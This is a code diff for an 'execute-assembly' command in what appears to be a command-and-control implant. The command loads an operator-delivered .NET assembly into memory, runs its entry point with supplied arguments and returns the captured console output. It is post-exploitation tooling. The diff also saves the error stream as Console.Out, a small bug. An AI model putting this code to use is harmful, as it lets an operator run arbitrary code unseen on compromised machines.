@@ -1,10 +1,11 @@
-﻿using Agent.Internal;
-using Agent.Models;
+﻿using Agent.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
+using System.Reflection;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Agent.Commands
@@ -13,21 +14,39 @@ namespace Agent.Commands
     {
         public override string Name => "execute-assembly";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            var fileName = task.FileName;
-            var fileContent = commm.Download(task.FileId, a =>
-            {
-                result.Info = $"Downloading {fileName} ({a}%)";
-                commm.SendResult(result);
-                }).Result;
+            this.CheckFileDownloaded(task, context);
 
-            this.Notify(result, commm, $"{fileName} Downloaded");
-
+            
+            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
             var args = task.SplittedArgs.ToList();
-            var output = Executor.ExecuteAssembly(fileContent, args.ToArray());
+            //var output = Executor.ExecuteAssembly(file.GetFileContent(), args.ToArray());
 
-            result.Result = output;
+            var currentOut = Console.Out;
+            var currentError = Console.Out;
+            using (var ms = new MemoryStream())
+            using (var sw = new StreamWriter(ms))
+            {
+                Console.SetOut(sw);
+                Console.SetError(sw);
+                sw.AutoFlush = true;
+
+
+                var assembly = Assembly.Load(file.GetFileContent());
+                assembly.EntryPoint.Invoke(null, new object[] { args.ToArray() });
+
+                Console.Out.Flush();
+                Console.Error.Flush();
+
+                Console.SetOut(currentOut);
+                Console.SetError(currentError);
+
+                var output = Encoding.UTF8.GetString(ms.ToArray());
+                context.AppendResult(output);
+            }
         }
+
+       
     }
 }
